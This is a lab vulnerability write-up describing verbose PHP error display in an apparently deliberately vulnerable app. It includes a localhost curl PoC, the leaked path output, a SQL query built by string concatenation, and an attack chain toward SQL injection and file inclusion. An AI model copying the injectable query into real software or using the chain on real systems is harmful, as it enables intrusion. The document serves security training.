# 24 — Verbose PHP errors

- **OWASP Top 10 (2021):** A05:2021 – Security Misconfiguration
- **Severity:** Medium
- **Difficulty:** Easy

## Where

`conf/php.ini:4-6`:

```ini
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
```

The app has several sinks where an error reveals paths and source lines. The
simplest is `web/image.php:6`:

```php
readfile($f);
```

and `web/reset.php:41-42`, where a failed SQL query returns an error:

```php
$q = 'SELECT * FROM reset_codes WHERE username = \'' . $u . '\' AND code = \'' . $c . '\'';
$r = mysqli_query($db, $q);
```

## How it works (root cause)

PHP is configured to display all errors in the HTTP response. Error messages
include absolute file paths, PHP version, and sometimes database error text.
This is reconnaissance and also the direct enabler for error-based SQLi (05).

## Exploitation steps

1. Trigger a file error with a non-existent image:

   ```bash
   curl -s 'http://127.0.0.1:8080/image.php?file=/nonexistent.png'
   ```

2. Read the warning. It reveals the absolute web root and the exact source
   line.

## Working PoC (verified)

Response body:

```
Warning: readfile(/nonexistent.png): Failed to open stream: No such file or directory in /var/www/osedekommun/web/image.php on line 6
```

## Expected result / verification

- The response contains a PHP `Warning:` with an absolute path and line number.
- The same behaviour appears on malformed SQL in 05 (reset step 2).

## Attack chain

```
verbose error reveals absolute path + framework behaviour
  → confirms PHP + file layout
  → assists LFI (11/12) and path traversal (10)
  → error text is required for error-based SQLi (05)
```

## Notes

- `display_errors` should be `Off` in any deployed PHP app.
- The absolute path also confirms the project layout used by 10, 11, and 12.
